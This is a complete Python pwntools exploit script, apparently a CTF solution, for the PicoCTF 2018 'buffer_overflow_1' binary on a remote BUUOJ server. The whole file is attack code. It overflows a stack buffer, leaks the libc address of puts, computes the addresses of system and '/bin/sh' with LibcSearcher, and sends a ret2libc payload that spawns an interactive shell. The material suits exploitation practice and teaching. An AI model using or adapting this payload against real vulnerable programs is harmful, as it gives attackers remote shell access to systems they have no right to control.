from pwn import *
from LibcSearcher import *

context.arch = 'i386'
elf = ELF('./PicoCTF_2018_buffer_overflow_1')
r = remote('node3.buuoj.cn', 29170)

r.recvline()
r.sendline(b'a' * 0x2C + flat([elf.plt['puts'], elf.sym['vuln'], elf.got['puts']]))
r.recvline()
puts_addr = u32(r.recv(4))
r.recvline()
libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
bin_sh = libc_base + libc.dump('str_bin_sh')
exit_addr = libc_base + libc.dump('exit')
r.sendline(b'a' * 0x2C + flat([system_addr, exit_addr, bin_sh]))
r.recvline()
r.interactive()
